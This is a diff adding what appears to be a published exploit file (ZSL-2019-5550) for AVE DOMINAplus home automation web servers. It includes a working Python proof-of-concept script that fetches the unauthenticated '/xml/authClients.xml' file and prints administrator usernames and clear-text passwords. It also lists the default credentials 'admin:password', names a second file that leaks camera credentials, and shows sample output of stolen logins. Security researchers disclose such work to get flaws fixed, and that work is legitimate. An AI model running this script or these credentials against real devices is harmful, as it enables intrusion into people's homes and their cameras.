@@ -1,0 +1,115 @@
+# Exploit: AVE DOMINAplus 1.10.x - Credential Disclosure
+# Date: 2019-12-30
+# Author: LiquidWorm
+# Vendor: AVE S.p.A.
+# Product web page: https://www.ave.it | https://www.domoticaplus.it
+# Affected version: Web Server Code 53AB-WBS - 1.10.62
+# Advisory ID: ZSL-2019-5550
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5550.php
+
+#!/usr/bin/env python
+#
+#
+# AVE DOMINAplus <=1.10.x Credentials Disclosure Exploit
+#
+#
+# Vendor: AVE S.p.A.
+# Product web page: https://www.ave.it | https://www.domoticaplus.it
+# Affected version: Web Server Code 53AB-WBS - 1.10.62
+#                   Touch Screen Code TS01 - 1.0.65
+#                   Touch Screen Code TS03x-V | TS04X-V - 1.10.45a
+#                   Touch Screen Code TS05 - 1.10.36
+#                   Models: 53AB-WBS
+#                           TS01
+#                           TS03V
+#                           TS04X-V
+#                           TS05N-V
+#                   App version: 1.10.77
+#                   App version: 1.10.65
+#                   App version: 1.10.64
+#                   App version: 1.10.62
+#                   App version: 1.10.60
+#                   App version: 1.10.52
+#                   App version: 1.10.52A
+#                   App version: 1.10.49
+#                   App version: 1.10.46
+#                   App version: 1.10.45
+#                   App version: 1.10.44
+#                   App version: 1.10.35
+#                   App version: 1.10.25
+#                   App version: 1.10.22
+#                   App version: 1.10.11
+#                   App version: 1.8.4
+#                   App version: TS1-1.0.65
+#                   App version: TS1-1.0.62
+#                   App version: TS1-1.0.44
+#                   App version: TS1-1.0.10
+#                   App version: TS1-1.0.9
+#
+# Summary: DOMINAplus - Sistema Domotica Avanzato. Advanced Home Automation System.
+# Designed to revolutionize your concept of living. DOMINA plus is the AVE home
+# automation proposal that makes houses safer, more welcoming and optimized. In
+# fact, our home automation system introduces cutting-edge technologies, designed
+# to improve people's lifestyle. DOMINA plus increases comfort, the level of safety
+# and security and offers advanced supervision tools in order to learn how to evaluate
+# and reduce consumption through various solutions dedicated to energy saving.
+#
+# Desc: The application suffers from clear-text credentials disclosure vulnerability
+# that allows an unauthenticated attacker to issue a request to an unprotected directory
+# that hosts an XML file '/xml/authClients.xml' and obtain administrative login information
+# that allows for a successful authentication bypass attack.
+#
+# Default credentials: admin:password
+# Configuration and camera credentials disclosure: /xml/tsconf.xml
+#
+# ==================================================
+# root@kali:~/domina# ./poc.py http://192.168.1.10
+#
+# Ze microfilm:
+# -------------
+# Username: arnoldcontrol
+# Password: P1sD0nt5pYMe
+# ==================================================
+#
+# Tested on: GNU/Linux 4.1.19-armv7-x7
+#            GNU/Linux 3.8.13-bone50/bone71.1/bone86
+#            Apache/2.4.7 (Ubuntu)
+#            Apache/2.2.22 (Debian)
+#            PHP/5.5.9-1ubuntu4.23
+#            PHP/5.4.41-0+deb7u1
+#            PHP/5.4.36-0+deb7u3
+#
+#
+# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
+#                             @zeroscience
+#
+#
+# Advisory ID: ZSL-2019-5550
+# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5550.php
+#
+#
+# 06.10.2019
+#
+
+import sys,re
+import xml.etree.ElementTree as XML
+
+from urllib2 import Request,urlopen
+
+if (len(sys.argv) <= 1):
+    print '[*] Usage: poc.py http://ip:port'
+    exit(0)
+
+host = sys.argv[1]
+headers = {'Accept': 'application/xml'}
+request = Request(host+'/xml/authClients.xml', headers=headers)
+print '\nZe microfilm:'
+print '-------------'
+xml = urlopen(request).read()
+tree = XML.fromstring(xml)
+
+for user in tree.findall('customer'):
+    print 'Username: ',user.get('plantCode')
+
+for pwd in tree.iter('password'):
+    print 'Password: '+pwd.text+'\n'
